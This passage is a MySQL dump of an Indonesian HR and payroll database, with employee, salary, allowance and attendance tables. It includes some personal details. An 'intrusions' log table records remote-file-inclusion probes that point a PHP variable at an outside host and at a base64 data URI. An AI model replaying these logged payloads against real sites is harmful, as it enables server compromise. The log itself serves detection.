# Host: localhost  (Version: 5.5.36)
# Date: 2014-10-22 16:38:28
# Generator: MySQL-Front 5.3  (Build 2.16)

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE */;
/*!40101 SET SQL_MODE='' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES */;
/*!40103 SET SQL_NOTES='ON' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS */;
/*!40014 SET FOREIGN_KEY_CHECKS=0 */;

#
# Source for table "actions"
#

DROP TABLE IF EXISTS `actions`;
CREATE TABLE `actions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `modul` varchar(20) NOT NULL DEFAULT '',
  `posisi` int(1) NOT NULL DEFAULT '0',
  `order` int(3) NOT NULL DEFAULT '0',
  `modul_id` int(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `modul_id` (`modul_id`)
) ENGINE=MyISAM AUTO_INCREMENT=37 DEFAULT CHARSET=latin1;

#
# Data for table "actions"
#

/*!40000 ALTER TABLE `actions` DISABLE KEYS */;
INSERT INTO `actions` VALUES (35,'news',1,0,32),(36,'news',1,1,1);
/*!40000 ALTER TABLE `actions` ENABLE KEYS */;

#
# Source for table "admin_hrd"
#

DROP TABLE IF EXISTS `admin_hrd`;
CREATE TABLE `admin_hrd` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `menu` varchar(30) NOT NULL DEFAULT '',
  `url` varchar(60) NOT NULL DEFAULT '',
  `mod` int(1) NOT NULL DEFAULT '0',
  `ordering` int(2) NOT NULL,
  `parent` int(2) NOT NULL DEFAULT '0',
  `icon` varchar(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=89 DEFAULT CHARSET=latin1;

#
# Data for table "admin_hrd"
#

/*!40000 ALTER TABLE `admin_hrd` DISABLE KEYS */;
INSERT INTO `admin_hrd` VALUES (2,'Settings','#',0,2,0,'settings.png'),(3,'Penggajian','#',0,5,0,'tools.png'),(4,'Master','#',0,3,0,'apperance.png'),(8,'Departemen','departemen',1,1,4,''),(10,'Setting WebSite','settingwebsite',1,6,2,''),(14,'User Login','user',1,1,2,''),(73,'Karyawan','#',0,4,0,'karyawan.png'),(75,'Jabatan','jabatan',1,2,4,''),(76,'Pendidikan','pendidikan',1,3,4,''),(77,'Status Karyawan','statuskaryawan',1,4,4,''),(79,'Daftar Karyawan','karyawan',1,1,73,''),(80,'History Karyawan','historykaryawan',1,2,73,''),(81,'Kelengkapan Berkas','kelengkapanberkas',1,3,73,''),(82,'Absensi Karyawan','absensi',1,4,73,''),(83,'Penggajian Karyawan','penggajian',1,1,3,''),(87,'Agama','agama',1,5,4,''),(88,'Cuti Karyawan','cuti',1,6,73,'');
/*!40000 ALTER TABLE `admin_hrd` ENABLE KEYS */;

#
# Source for table "hrd_absensi"
#

DROP TABLE IF EXISTS `hrd_absensi`;
CREATE TABLE `hrd_absensi` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `karyawan` int(4) NOT NULL,
  `masuk` int(3) NOT NULL DEFAULT '0',
  `lembur` int(3) NOT NULL DEFAULT '0',
  `sakit` int(3) NOT NULL DEFAULT '0',
  `alpha` int(3) NOT NULL DEFAULT '0',
  `telat` int(3) NOT NULL DEFAULT '0',
  `bulan` int(2) NOT NULL,
  `tahun` varchar(4) NOT NULL DEFAULT '0000',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_absensi"
#

INSERT INTO `hrd_absensi` VALUES (4,34,20,30,4,1,30,6,'2014'),(5,34,25,0,0,0,0,5,'2014'),(6,34,25,0,0,0,0,1,'2014'),(8,35,25,0,0,0,0,1,'2014');

#
# Source for table "hrd_agama"
#

DROP TABLE IF EXISTS `hrd_agama`;
CREATE TABLE `hrd_agama` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `tunjangan` varchar(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_agama"
#

/*!40000 ALTER TABLE `hrd_agama` DISABLE KEYS */;
INSERT INTO `hrd_agama` VALUES (1,'Islam','0'),(2,'Protestan','0'),(3,'Katolik','0'),(4,'Budha','0'),(5,'Hindu','0');
/*!40000 ALTER TABLE `hrd_agama` ENABLE KEYS */;

#
# Source for table "hrd_bayar"
#

DROP TABLE IF EXISTS `hrd_bayar`;
CREATE TABLE `hrd_bayar` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `tgl` date NOT NULL,
  `bayar` varchar(255) NOT NULL,
  `karyawan` int(4) NOT NULL DEFAULT '0',
  `pid` int(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_bayar"
#

/*!40000 ALTER TABLE `hrd_bayar` DISABLE KEYS */;
INSERT INTO `hrd_bayar` VALUES (1,'2014-06-30','120000',35,1),(3,'2014-06-30','80000',35,1),(5,'2014-06-30','100000',35,7),(6,'2014-07-02','250000',34,12),(14,'2014-07-15','250000',36,14);
/*!40000 ALTER TABLE `hrd_bayar` ENABLE KEYS */;

#
# Source for table "hrd_bebantugas"
#

DROP TABLE IF EXISTS `hrd_bebantugas`;
CREATE TABLE `hrd_bebantugas` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_bebantugas"
#

/*!40000 ALTER TABLE `hrd_bebantugas` DISABLE KEYS */;
INSERT INTO `hrd_bebantugas` VALUES (1,'Tidak Ada','0','0'),(2,'SD_1,2,3','10','0'),(3,'SD_4-6','15','0'),(4,'G-7','25','0');
/*!40000 ALTER TABLE `hrd_bebantugas` ENABLE KEYS */;

#
# Source for table "hrd_berkas"
#

DROP TABLE IF EXISTS `hrd_berkas`;
CREATE TABLE `hrd_berkas` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `gambar` varchar(200) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL DEFAULT '',
  `karyawan` int(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_berkas"
#

/*!40000 ALTER TABLE `hrd_berkas` DISABLE KEYS */;
INSERT INTO `hrd_berkas` VALUES (13,'77781de5f93b2b1a44b8ba1afa4f0963.jpg',34),(14,'ee7daf049e52869fe7d64ef7b60ede8c.jpg',34);
/*!40000 ALTER TABLE `hrd_berkas` ENABLE KEYS */;

#
# Source for table "hrd_bulan"
#

DROP TABLE IF EXISTS `hrd_bulan`;
CREATE TABLE `hrd_bulan` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `bulan` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_bulan"
#

INSERT INTO `hrd_bulan` VALUES (1,'Januari'),(2,'Februari'),(3,'Maret'),(4,'April'),(5,'Mei'),(6,'Juni'),(7,'Juli'),(8,'Agustus'),(9,'September'),(10,'Oktober'),(11,'Nopember'),(12,'Desember');

#
# Source for table "hrd_cuti"
#

DROP TABLE IF EXISTS `hrd_cuti`;
CREATE TABLE `hrd_cuti` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `karyawan` int(4) NOT NULL,
  `tahun` varchar(4) NOT NULL,
  `tgl` date NOT NULL,
  `cuti` varchar(512) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_cuti"
#

INSERT INTO `hrd_cuti` VALUES (1,36,'2014','2014-06-26','asdsad'),(3,36,'2014','2014-07-01','Ke Luar Negeri');

#
# Source for table "hrd_departemen"
#

DROP TABLE IF EXISTS `hrd_departemen`;
CREATE TABLE `hrd_departemen` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `tunjangan` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_departemen"
#

INSERT INTO `hrd_departemen` VALUES (3,'KEUANGAN','0'),(4,'TATA USAHA','0'),(5,'HRD','0'),(6,'UMUM','0'),(7,'IT','0'),(8,'MARKETING','0');

#
# Source for table "hrd_fungsional"
#

DROP TABLE IF EXISTS `hrd_fungsional`;
CREATE TABLE `hrd_fungsional` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_fungsional"
#

/*!40000 ALTER TABLE `hrd_fungsional` DISABLE KEYS */;
INSERT INTO `hrd_fungsional` VALUES (1,'Tidak Ada','0','0'),(2,'3A','20','0'),(3,'3B','25','0'),(4,'3C','30','0');
/*!40000 ALTER TABLE `hrd_fungsional` ENABLE KEYS */;

#
# Source for table "hrd_golongan"
#

DROP TABLE IF EXISTS `hrd_golongan`;
CREATE TABLE `hrd_golongan` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `gajipokok` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=27 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_golongan"
#

/*!40000 ALTER TABLE `hrd_golongan` DISABLE KEYS */;
INSERT INTO `hrd_golongan` VALUES (2,'2A0','1115370'),(3,'2B0','1239300'),(4,'2C0','1377000'),(5,'2D0','1530000'),(6,'3A0','1700000'),(7,'3B0','1870000'),(8,'3C0','2057000'),(9,'3D0','2262700'),(10,'4A0','2488970'),(11,'4B0','2737867'),(12,'4C0','3011654'),(13,'4D0','3312819'),(14,'11','1054025'),(15,'2A1','1171139'),(16,'2B1','1301265'),(17,'2C1','1445850'),(18,'2D1','1606500'),(19,'3A1','1785000'),(20,'3B1','1963500'),(21,'3C1','2159850'),(22,'3D1','2375835'),(23,'4A1','2613419'),(24,'4B1','2874760'),(25,'4C1','3162236'),(26,'4D1','3478460');
/*!40000 ALTER TABLE `hrd_golongan` ENABLE KEYS */;

#
# Source for table "hrd_history"
#

DROP TABLE IF EXISTS `hrd_history`;
CREATE TABLE `hrd_history` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `tgl` date NOT NULL,
  `history` varchar(255) NOT NULL,
  `gambar` varchar(200) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL DEFAULT '',
  `karyawan` int(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_history"
#

/*!40000 ALTER TABLE `hrd_history` DISABLE KEYS */;
INSERT INTO `hrd_history` VALUES (5,'2014-06-27','test','2c7643c9261eddb62ad914ddc60c29b3.jpg',34);
/*!40000 ALTER TABLE `hrd_history` ENABLE KEYS */;

#
# Source for table "hrd_istrianak"
#

DROP TABLE IF EXISTS `hrd_istrianak`;
CREATE TABLE `hrd_istrianak` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_istrianak"
#

/*!40000 ALTER TABLE `hrd_istrianak` DISABLE KEYS */;
INSERT INTO `hrd_istrianak` VALUES (1,'Tidak Ada','0','0'),(2,'Istri Anak','10','0');
/*!40000 ALTER TABLE `hrd_istrianak` ENABLE KEYS */;

#
# Source for table "hrd_jabatan"
#

DROP TABLE IF EXISTS `hrd_jabatan`;
CREATE TABLE `hrd_jabatan` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `tunjangan` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_jabatan"
#

INSERT INTO `hrd_jabatan` VALUES (5,'GURU','0'),(6,'STAFF','0'),(7,'DIREKTUR','0');

#
# Source for table "hrd_karyawan"
#

DROP TABLE IF EXISTS `hrd_karyawan`;
CREATE TABLE `hrd_karyawan` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nip` varchar(15) NOT NULL DEFAULT '',
  `nama` varchar(100) NOT NULL DEFAULT '',
  `kotalahir` varchar(255) NOT NULL,
  `tgllahir` date NOT NULL,
  `kelamin` varchar(15) NOT NULL DEFAULT '',
  `agama` varchar(20) NOT NULL DEFAULT '',
  `menikah` varchar(50) NOT NULL,
  `alamat` varchar(255) NOT NULL DEFAULT '',
  `kota` varchar(100) NOT NULL DEFAULT '',
  `kodepos` varchar(255) NOT NULL,
  `propinsi` varchar(100) NOT NULL DEFAULT '',
  `negara` varchar(100) NOT NULL DEFAULT '',
  `telepon` varchar(15) NOT NULL DEFAULT '-',
  `handphone` varchar(15) NOT NULL DEFAULT '-',
  `foto` text NOT NULL,
  `departemen` varchar(255) NOT NULL,
  `jabatan` varchar(255) NOT NULL,
  `status` varchar(255) NOT NULL,
  `pendidikan_terakhir` varchar(255) NOT NULL,
  `tglditerima` date NOT NULL,
  `tglpercobaan` date NOT NULL,
  `tglkontrak` date NOT NULL,
  `jatahcuti` int(2) NOT NULL DEFAULT '0',
  `tipe` enum('0','1','2') NOT NULL DEFAULT '1',
  `tglresign` date NOT NULL,
  `alasan` varchar(255) NOT NULL,
  `lampiran` varchar(255) NOT NULL,
  `tglmelamar` date NOT NULL,
  `golongan` varchar(5) NOT NULL DEFAULT '1',
  `struktural` varchar(5) NOT NULL DEFAULT '1',
  `fungsional` varchar(5) NOT NULL DEFAULT '1',
  `pengabdian` varchar(5) NOT NULL DEFAULT '1',
  `istrianak` varchar(5) NOT NULL DEFAULT '1',
  `uangmakan` varchar(5) NOT NULL DEFAULT '1',
  `uangtransport` varchar(5) NOT NULL DEFAULT '1',
  `bebantugas` varchar(5) NOT NULL DEFAULT '1',
  `walikelas` varchar(5) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=39 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_karyawan"
#

/*!40000 ALTER TABLE `hrd_karyawan` DISABLE KEYS */;
INSERT INTO `hrd_karyawan` VALUES (34,'12345','Farah Agustina','Surabaya','1983-07-20','2','3','1','alamat','kota','kodepos','propinsi','indonesia','1234321','1122334455','b3c730460a0527a8f4f93308e9fac838.jpg','6','6','7','4','2014-06-02','2014-06-30','0000-00-00',0,'1','0000-00-00','','','0000-00-00','','','','','','','','',''),(35,'2345678','Edward','Majalengka','1977-07-23','1','3','1','Jl. Mojo 55','Mojokerto','','Jawa Timur','Indonesia','','','27c5cc578e47883fcde670c24b8f74a3.jpg','6','6','3','4','2014-01-01','2014-06-30','0000-00-00',2,'1','0000-00-00','','','0000-00-00','6','1','1','1','1','1','1','2','1'),(36,'665544','Jamess','','0000-00-00','1','3','2','','','','','','','','07e8ab1d000c98c2cf7a5b51a7211734.jpg','6','5','3','4','2012-07-04','0000-00-00','0000-00-00',0,'1','0000-00-00','','','0000-00-00','6','2','2','2','2','1','1','2','2'),(37,'','Agus Suherman','Surabaya','1970-07-11','-','-','-','','','','','','','','5e75036ae08c19458569b7d2a496964c.jpg','','','','4','0000-00-00','0000-00-00','0000-00-00',0,'0','0000-00-00','','','2014-07-10','','','','','','','','',''),(38,'','asrifin','sidoarjo','1989-10-15','1','1','2','krian','krian','61262','Jawatimur','Indonesia','02222','099888','','','','','9','0000-00-00','0000-00-00','0000-00-00',0,'0','0000-00-00','','','2014-10-22','1','1','1','1','1','1','1','1','1');
/*!40000 ALTER TABLE `hrd_karyawan` ENABLE KEYS */;

#
# Source for table "hrd_kelamin"
#

DROP TABLE IF EXISTS `hrd_kelamin`;
CREATE TABLE `hrd_kelamin` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `kelamin` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_kelamin"
#

/*!40000 ALTER TABLE `hrd_kelamin` DISABLE KEYS */;
INSERT INTO `hrd_kelamin` VALUES (1,'Laki-laki'),(2,'Perempuan');
/*!40000 ALTER TABLE `hrd_kelamin` ENABLE KEYS */;

#
# Source for table "hrd_menikah"
#

DROP TABLE IF EXISTS `hrd_menikah`;
CREATE TABLE `hrd_menikah` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `tunjangan` varchar(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_menikah"
#

INSERT INTO `hrd_menikah` VALUES (1,'Menikah','0'),(2,'Belum Menikah','0');

#
# Source for table "hrd_pendidikan"
#

DROP TABLE IF EXISTS `hrd_pendidikan`;
CREATE TABLE `hrd_pendidikan` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `tunjangan` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_pendidikan"
#

INSERT INTO `hrd_pendidikan` VALUES (3,'SMA','0'),(4,'S1','0'),(5,'S2','0'),(6,'S3','0'),(7,'D1','0'),(8,'D2','0'),(9,'D3','0'),(10,'D4','0');

#
# Source for table "hrd_pengabdian"
#

DROP TABLE IF EXISTS `hrd_pengabdian`;
CREATE TABLE `hrd_pengabdian` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_pengabdian"
#

/*!40000 ALTER TABLE `hrd_pengabdian` DISABLE KEYS */;
INSERT INTO `hrd_pengabdian` VALUES (1,'Tidak Ada','0','0'),(2,'Pengabdian','20','0');
/*!40000 ALTER TABLE `hrd_pengabdian` ENABLE KEYS */;

#
# Source for table "hrd_penggajian"
#

DROP TABLE IF EXISTS `hrd_penggajian`;
CREATE TABLE `hrd_penggajian` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `karyawan` int(4) NOT NULL,
  `bulan` int(2) NOT NULL,
  `tahun` varchar(4) NOT NULL,
  `gajipokok` varchar(50) NOT NULL DEFAULT '0',
  `tstruktural` varchar(50) NOT NULL DEFAULT '0',
  `tfungsional` varchar(50) NOT NULL DEFAULT '0',
  `tpengabdian` varchar(50) NOT NULL DEFAULT '0',
  `tistrianak` varchar(50) NOT NULL DEFAULT '0',
  `tuangmakan` varchar(50) NOT NULL DEFAULT '0',
  `tuangtransport` varchar(50) NOT NULL DEFAULT '0',
  `tbebantugas` varchar(50) NOT NULL DEFAULT '0',
  `twalikelas` varchar(50) NOT NULL DEFAULT '0',
  `pointreward` varchar(50) NOT NULL DEFAULT '0',
  `tprestasi` varchar(50) NOT NULL DEFAULT '0',
  `tlain` varchar(50) NOT NULL DEFAULT '0',
  `thr` varchar(50) NOT NULL DEFAULT '0',
  `ppinjaman` varchar(50) NOT NULL DEFAULT '0',
  `jamsostek` varchar(50) NOT NULL DEFAULT '0',
  `pointterlambat` varchar(50) NOT NULL DEFAULT '0',
  `pterlambat` varchar(50) NOT NULL DEFAULT '0',
  `pph21` varchar(50) NOT NULL DEFAULT '0',
  `plain` varchar(50) NOT NULL DEFAULT '0',
  `gajibersih` varchar(50) NOT NULL DEFAULT '0',
  `idbayar` varchar(255) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=34 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_penggajian"
#

INSERT INTO `hrd_penggajian` VALUES (32,36,7,'2014','1700000','510000','340000','340000','170000','85000','85000','170000','255000','','0','0','0','250000','17000','0','0','17000','0','3371000','14'),(33,35,10,'2014','1700000','0','0','0','0','85000','85000','170000','0','0','0','0','0','0','17000','0','0','17000','0','2006000','5');

#
# Source for table "hrd_pinjaman"
#

DROP TABLE IF EXISTS `hrd_pinjaman`;
CREATE TABLE `hrd_pinjaman` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `tgl` date NOT NULL,
  `pinjaman` varchar(255) NOT NULL,
  `karyawan` int(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_pinjaman"
#

/*!40000 ALTER TABLE `hrd_pinjaman` DISABLE KEYS */;
INSERT INTO `hrd_pinjaman` VALUES (1,'2014-06-02','200000',35),(7,'2014-06-30','100000',35),(12,'2014-07-01','1000000',34),(14,'2014-02-04','500000',36);
/*!40000 ALTER TABLE `hrd_pinjaman` ENABLE KEYS */;

#
# Source for table "hrd_setting"
#

DROP TABLE IF EXISTS `hrd_setting`;
CREATE TABLE `hrd_setting` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `thr` varchar(5) NOT NULL,
  `reward` varchar(50) NOT NULL DEFAULT '0',
  `terlambat` varchar(50) NOT NULL DEFAULT '0',
  `pph21` varchar(50) NOT NULL DEFAULT '0',
  `jamsostek` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_setting"
#

INSERT INTO `hrd_setting` VALUES (1,'30','50000','50000','1','1');

#
# Source for table "hrd_statuskaryawan"
#

DROP TABLE IF EXISTS `hrd_statuskaryawan`;
CREATE TABLE `hrd_statuskaryawan` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `nama` varchar(255) NOT NULL,
  `tunjangan` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_statuskaryawan"
#

INSERT INTO `hrd_statuskaryawan` VALUES (3,'Tetap','0'),(7,'Tidak Tetap','0'),(8,'Part Time','0');

#
# Source for table "hrd_struktural"
#

DROP TABLE IF EXISTS `hrd_struktural`;
CREATE TABLE `hrd_struktural` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_struktural"
#

/*!40000 ALTER TABLE `hrd_struktural` DISABLE KEYS */;
INSERT INTO `hrd_struktural` VALUES (1,'Tidak Ada','0','0'),(2,'Struktural','30','0');
/*!40000 ALTER TABLE `hrd_struktural` ENABLE KEYS */;

#
# Source for table "hrd_tipe"
#

DROP TABLE IF EXISTS `hrd_tipe`;
CREATE TABLE `hrd_tipe` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `tipe` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_tipe"
#

INSERT INTO `hrd_tipe` VALUES (1,'Aktif'),(2,'Resign'),(3,'Calon');

#
# Source for table "hrd_uangmakan"
#

DROP TABLE IF EXISTS `hrd_uangmakan`;
CREATE TABLE `hrd_uangmakan` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_uangmakan"
#

/*!40000 ALTER TABLE `hrd_uangmakan` DISABLE KEYS */;
INSERT INTO `hrd_uangmakan` VALUES (1,'Tidak Ada','5','0');
/*!40000 ALTER TABLE `hrd_uangmakan` ENABLE KEYS */;

#
# Source for table "hrd_uangtransport"
#

DROP TABLE IF EXISTS `hrd_uangtransport`;
CREATE TABLE `hrd_uangtransport` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_uangtransport"
#

/*!40000 ALTER TABLE `hrd_uangtransport` DISABLE KEYS */;
INSERT INTO `hrd_uangtransport` VALUES (1,'Uang Transport','5','0');
/*!40000 ALTER TABLE `hrd_uangtransport` ENABLE KEYS */;

#
# Source for table "hrd_walikelas"
#

DROP TABLE IF EXISTS `hrd_walikelas`;
CREATE TABLE `hrd_walikelas` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `persen` varchar(50) NOT NULL DEFAULT '0',
  `nominal` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

#
# Data for table "hrd_walikelas"
#

/*!40000 ALTER TABLE `hrd_walikelas` DISABLE KEYS */;
INSERT INTO `hrd_walikelas` VALUES (1,'Tidak Ada','0','0'),(2,'Wali Kelas','15','0');
/*!40000 ALTER TABLE `hrd_walikelas` ENABLE KEYS */;

#
# Source for table "intrusions"
#

DROP TABLE IF EXISTS `intrusions`;
CREATE TABLE `intrusions` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL DEFAULT '',
  `value` text NOT NULL,
  `page` varchar(255) NOT NULL DEFAULT '',
  `ip` varchar(15) NOT NULL DEFAULT '',
  `impact` int(11) unsigned NOT NULL DEFAULT '0',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

#
# Data for table "intrusions"
#

/*!40000 ALTER TABLE `intrusions` DISABLE KEYS */;
INSERT INTO `intrusions` VALUES (1,'judul','ibrahimovic-hamil-delapan-bulan-3-6-2','/auracms2.3/article-9-ibrahimovic-hamil-delapan-bulan-3-6-2.html','local/unknown',7,'2010-08-28 04:00:00'),(2,'_SERVER.DOCUMENT_ROOT','http://94.199.51.7/readme.txt?','/?_SERVER[DOCUMENT_ROOT]=http://94.199.51.7/readme.txt?','94.199.51.7',5,'2013-04-17 00:41:17'),(3,'_ult','sec=web&slk=web&pos=3&linkstr=http%3A%2F%2Fppikom.com%2Farticle-cara-mengkrimping-kabel-rj45-dan-urutan-warna-kabel-straight-amp-cross.html','/article-cara-mengkrimping-kabel-rj45-dan-urutan-warna-kabel-straight-amp-cross.html?_ult=sec%3Dweb%26slk%3Dweb%26pos%3D3%26linkstr%3Dhttp%253A%252F%252Fppikom.com%252Farticle-cara-mengkrimping-kabel-rj45-dan-urutan-warna-kabel-straight-amp-cross.html','50.57.206.196',15,'2013-06-20 15:11:19'),(4,'_SERVER.DOCUMENT_ROOT','data://text/plain;base64,U0hFTExfTU9KTk9fUFJPQk9WQVRK?','/?_SERVER[DOCUMENT_ROOT]=data://text/plain;base64,U0hFTExfTU9KTk9fUFJPQk9WQVRK?','79.135.239.234',10,'2013-09-09 06:15:10');
/*!40000 ALTER TABLE `intrusions` ENABLE KEYS */;

#
# Source for table "menu_editor"
#

DROP TABLE IF EXISTS `menu_editor`;
CREATE TABLE `menu_editor` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `menu` varchar(255) NOT NULL DEFAULT '',
  `url` varchar(255) NOT NULL DEFAULT '',
  `ordering` int(2) NOT NULL,
  `parent` int(4) NOT NULL DEFAULT '0',
  `icon` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=latin1;

#
# Data for table "menu_editor"
#

/*!40000 ALTER TABLE `menu_editor` DISABLE KEYS */;
